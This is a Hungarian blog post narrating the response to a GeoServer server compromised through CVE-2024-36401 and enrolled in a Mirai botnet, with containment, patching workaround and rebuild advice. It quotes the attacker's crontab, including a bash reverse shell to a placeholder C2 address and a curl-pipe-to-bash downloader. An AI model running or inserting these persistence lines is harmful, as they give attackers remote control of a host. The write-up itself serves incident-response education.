---
title: "Egy GeoServer-betörés anatómiája"
date: 2026-06-01 21:59:28 +0200
tags: [Linux, GeoServer, Biztonság, Malware]
header:
  teaser: https://github.com/user-attachments/assets/548f8015-741e-4f54-8045-bcf27f467c46
comments: true
published: true
pinned: false
---

Minden egy ártalmatlannak tűnő logfájllal kezdődött.

<!--more-->

![linux/malware](https://github.com/user-attachments/assets/548f8015-741e-4f54-8045-bcf27f467c46)

Az `auth.log` percenként ismétlődő sorokkal volt tele:

```
CRON[xxxx]: pam_unix(cron:session): session opened for user tomcat8 by (uid=0)
CRON[xxxx]: pam_unix(cron:session): session closed for user tomcat8
```

Első ránézésre ez teljesen normális: ha egy felhasználónak van percenként futó cron-jobja, a PAM minden futáshoz logol egy `opened`/`closed` párt. A `(uid=0)` is csak annyit jelent, hogy a cron démon (root) indítja a jobot az adott felhasználó nevében. Semmi vészjósló.

Aztán megnéztem, mi az a percenként futó job.

## A pillanat, amikor a gyomrom összeszorult

```bash
crontab -u tomcat8 -l
```

A kimenet önmagáért beszélt:

```
* * * * * bash -c 'bash -i >& /dev/tcp/<C2-IP>/4444 0>&1'
* * * * * /tmp/.XIN-unix/<binary> || curl -sL <IP>/setup | bash
* * * * * /tmp/test.sh
```

Három klasszikus rosszindulatú minta egy helyen:

- **Reverse shell** — percenként megpróbál visszacsatlakozni a támadó gépére, és teljes parancssort adni neki.
- **Elrejtett bináris futtatása** egy `.XIN-unix` nevű mappából (a legitim `.X11-unix` / `.ICE-unix` rendszermappák utánzása), tartalék letöltővel egy másik IP-ről.
- Egy harmadik, ismeretlen szkript.

Ekkor vált világossá: a szerver kompromittált.

## Az első szabály: ne ess pánikba, de cselekedj sorrendben

Egy kompromittált gépnél a sorrend számít. A hálózati elszigetelés jön először, mert amíg a reverse shell él, a támadó valós időben tud reagálni arra, amit csinálsz.

**1. Vágd el a kifelé menő kapcsolatot.** Blokkold a támadó IP-ket és a reverse shell portját:

```bash
iptables -A OUTPUT -d <C2-IP> -j DROP
iptables -A OUTPUT -p tcp --dport 4444 -j DROP
```

**2. Ments bizonyítékot, mielőtt bármit törölnél.** A kapkodva törölt malware elemezhetetlen:

```bash
mkdir -p /root/incident-evidence
crontab -u <user> -l > /root/incident-evidence/cron.txt
```

**3. Csak ezután kezdj takarítani.**

## A nyomozás: mit látsz, és mit jelent

A következő lépés annak felmérése volt, mi fut és mihez kapcsolódik:

```bash
ss -tnp | grep ESTAB
ps aux --sort=-%cpu | head -20
```

Itt egy fontos buktató. A process-listán szerepelt egy `[kdevtmpfs]` nevű elem — ez **valódi kernel-folyamat** (a szögletes zárójel a jele), nem szabad összekeverni a `kdevtmpfsi` nevű, ehhez szándékosan hasonlító bányász-malware-rel. A támadók pont arra építenek, hogy a védekező összezavarodjon a nevek hasonlóságától.

Az aktív kapcsolatok vizsgálatakor előkerült egy gyanús folyamat, ami egy ártalmatlan rendszerdémonnak álcázta magát. A `lsof` és az `ss` egy álnevet mutatott, miközben a tényleges futtatható fájl a `/tmp`-ből futott:

```bash
ls -la /proc/<pid>/exe   # -> /tmp/<binary>
cat /proc/<pid>/cmdline  # a meghamisított név
```

Tanulság: **mindig a `/proc/<pid>/exe` valódi célját nézd, ne a process nevét.** Az utóbbi hazudik.

## A belépési pont megtalálása

A kulcskérdés mindig ez: hogyan jutottak be? A cron-jobok mind ugyanazon felhasználó nevében futottak — egy Java alkalmazásszerver szolgáltatás-felhasználója nevében. Ez azonnal egy publikus webalkalmazásra terelte a gyanút.

A `webapps` könyvtárban ott volt a felelős: egy **több éves, elavult GeoServer-telepítés**. A GeoServer egy nyílt forráskódú térinformatikai szerver, és sajnos népszerű célpont, mert gyakran publikusan elérhető, és több súlyos, autentikáció nélküli távoli kódfuttatási (RCE) sebezhetősége is ismert.

A konkrét bűnös a **CVE-2024-36401** volt — egy 9.8-as CVSS-pontszámú kritikus hiba. A lényege: a GeoServer a kérések property-neveit XPath-kifejezésként értékeli ki egy olyan komponenssel, amit eredetileg csak komplex adattípusokhoz szántak, de tévesen az egyszerű típusokra is alkalmaztak. Ez lehetővé teszi, hogy a támadó speciálisan formázott kéréssel kódot futtasson — bejelentkezés nélkül, számos gyakran nyitott OGC-végponton keresztül (WMS, WFS, WPS).

## A foltozás dilemmája: amikor nem frissíthetsz

Itt jött a nehéz rész. A szerveren **kritikus szolgáltatások** múltak a GeoServeren, így nem lehetett csak úgy leállítani. A frissítés pedig azért volt kockázatos, mert az újabb GeoServer-verziók újabb Java-t igényelnek, ami az elavult operációs rendszeren láncreakciót indított volna el.

Szerencsére a GeoServer fejlesztői **verziófrissítés nélküli hivatalos megkerülő megoldást** is kiadtak: a sebezhető modul (`gt-complex-x.y.jar`) eltávolítását a `WEB-INF/lib` könyvtárból. Ez megszünteti a sebezhető kódot.

A kulcskérdés: **megtörik-e ettől valami?** A `gt-complex` modul a komplex (app-schema) adattípusokhoz kell. Ha a szerver csak egyszerű forrásokat szolgál ki — például shapefile-okat —, akkor ezt a funkciót biztosan nem használja, és az eltávolítás észrevétlen marad. A biztonságos eljárás:

```bash
# 1. Mentsd a JAR-t a webapps-on KÍVÜLRE (hogy a restart ne olvassa vissza)
cp <pathto>/gt-complex-*.jar /root/backup/

# 2. Töröld és indítsd újra
rm <pathto>/gt-complex-*.jar
systemctl restart <tomcat-service>

# 3. Ellenőrizd, hogy felállt és a rétegek válaszolnak
# Ha bármi eltörik: másold vissza a JAR-t a backupból, és újraindít.
```

A leglényegesebb biztonsági elv viszont ez volt: **a sebezhetőség azért kihasználható, mert a szolgáltatás közvetlenül elérhető az internet felől.** Ha a támadó nem éri el a sebezhető végpontot, a hiba gyakorlatilag kihasználhatatlanná válik — anélkül, hogy magához az alkalmazáshoz hozzányúlnál. Ezért a tűzfalszintű hozzáférés-korlátozás (csak ismert kliens-IP-k, vagy VPN mögé helyezés) gyakran hatásosabb és kockázatmentesebb, mint maga a foltozás.

## A csavar: a malware visszatért restart után

A `gt-complex` eltávolítása után az alkalmazás szépen felállt. De a szolgáltatás állapotának ellenőrzésekor a process-fában ott volt egy idegen elem — egy `/tmp`-ből futó bináris, ami a szolgáltatás cgroupjában indult újra.

Ez a tanulság, amit nem lehet elégszer hangsúlyozni: **egy kompromittált gépen a látható tünet ritkán a teljes kép.** A cron törölve volt, de egy korábban már elindított folyamat túlélte, vagy a deploy hozta vissza. A binárist kimentettem bizonyítéknak, majd leállítottam, és töröltem magát a fájlt is, hogy ne legyen mit újraindítani.

## Mi volt ez valójában?

A kimentett bináris SHA256 hash-ét feltöltöttem a VirusTotal-ra (fontos: a *hash*-t, nem feltétlenül magát a fájlt). A találat: egy **Mirai-botnet variáns**, becsomagolt formában.

Ez érdekes részlet. A Mirai eredetileg IoT-eszközöket fertőző, DDoS-támadásokra szakosodott botnet volt, amelynek forráskódja 2016-ban kiszivárgott. Azóta számtalan leszármazottja terjed, amelyek már szervereket is céloznak sebezhető webalkalmazásokon keresztül, és gyakran hibrid működésűek: DDoS és kriptobányászat egyszerre.

A gyakorlati jelentősége: a szerver egy **botnet tagjává** vált, amit távolról vezéreltek. Nemcsak áldozat volt, hanem potenciálisan eszköz is mások károsítására. A jó hír, hogy a Mirai-variánsok jellemzően nem mélyen beásó rootkitek — memóriából, `/tmp`-ből futnak, és újraindításkor egy letöltő hozza vissza őket. Pont ezért működött a tünetek kezelése: a cron törlése, a bináris eltávolítása és az RCE-út lezárása együtt elvágta az újraindulás láncát.

## Az átmeneti védőháló: egy egyszerű watchdog

Mivel a végleges megoldás (tiszta rendszerre költözés) hetekbe telik, készítettem egy egyszerű, rootból futó watchdog-szkriptet az átmeneti időre. Ez 5 percenként ellenőrzi a már ismert fertőzés-jeleket: gyanús nevű folyamatokat (a tényleges `exe`-célt is vizsgálva, nem csak a hamis nevet), kapcsolatokat az ismert C2-címekhez, futtatható fájlokat a temp-könyvtárak tetején, és a szolgáltatás-felhasználó cronjának újra-megjelenését. Ha talál valamit, leállítja, karanténba teszi (nem törli — bizonyítéknak), és naplóz.

Fontos viszont reálisan kezelni: egy ilyen watchdog **a már ismert fertőzés visszatérését fékezi**, nem páncél. A hálózati hozzáférés-korlátozás fontosabb nála, mert az a betörést akadályozza meg, nem csak a tünetet kezeli.

## Miért nem elég a takarítás?

A vizsgálat során **kétszer** is kiderült, hogy a látható tünet alatt volt még valami: előbb eltűnt `/tmp`-payloadok, amelyeket a cron újratöltött volna, majd egy aktív, álcázott botnet-folyamat. Ez a minta pontosan az, amiért egy kompromittált gépet nem lehet megbízhatóan „kitakarítani". Sosem tudhatod biztosan, hogy az utolsó komponenst is megtaláltad-e.

A helyes, végleges megoldás ezért: **a szervert tiszta alapokról újraépíteni.** A mi esetünkben ez azt jelenti, hogy egy frissen telepített, támogatott operációs rendszerre, aktuális szoftververziókkal, *csak az adatok* kerülnek át — nem futtatható fájlok, nem teljes lemezképek. Mivel a szolgáltatott rétegek shapefile-ok voltak, ez a migráció valójában egyszerű: az adatkönyvtár hordozható a verziók között.

## A tanulságok dióhéjban

1. **Ne hagyj internet felé nyitva elavult szoftvert.** A legtöbb betörés ismert, befoltozott sebezhetőségeken keresztül történik. Egy több éves verzió nyitott porton meghívás a bajra.

2. **A hálózati hozzáférés-korlátozás gyakran többet ér a foltozásnál.** Ha valami nem kell publikusan, ne legyen publikus — tűzfal vagy VPN mögé vele.

3. **Bizonyíték először, törlés utána.** A kapkodva eltüntetett malware nem mond el semmit arról, mi és hogyan történt.

4. **A nevek hazudnak.** A process-álcák, a legitim rendszerelemekhez hasonló elnevezések szándékosak. Mindig a tényleges futtatható fájl útvonalát és a hash-ét nézd.

5. **A tünet nem a betegség.** A futó folyamat leállítása nem azonos a fertőzés megszüntetésével. Keresd a belépési pontot és a perzisztencia-mechanizmusokat.

6. **Egy kompromittált gép a megtisztítás után is gyanús marad.** A végleges nyugalom egyetlen forrása a tiszta újraépítés.

Az incidens kezelése néhány óra alatt megtörtént, és a szerver azóta stabil. De a tényleges lezárás nem a malware leállítása volt — hanem a döntés, hogy az egész stacket frissen, tiszta alapokról építjük újra. A többi csak tűzoltás.

---

*Ha hasonló helyzetbe kerülsz: a sorrend mindig az elszigetelés, a bizonyíték-mentés, a nyomozás, majd a végleges újraépítés. És ne feledd — a foltozás sürgős, de a megelőzés (naprakész szoftver, zárt hálózat, minimális támadási felület) olcsóbb minden tűzoltásnál.*
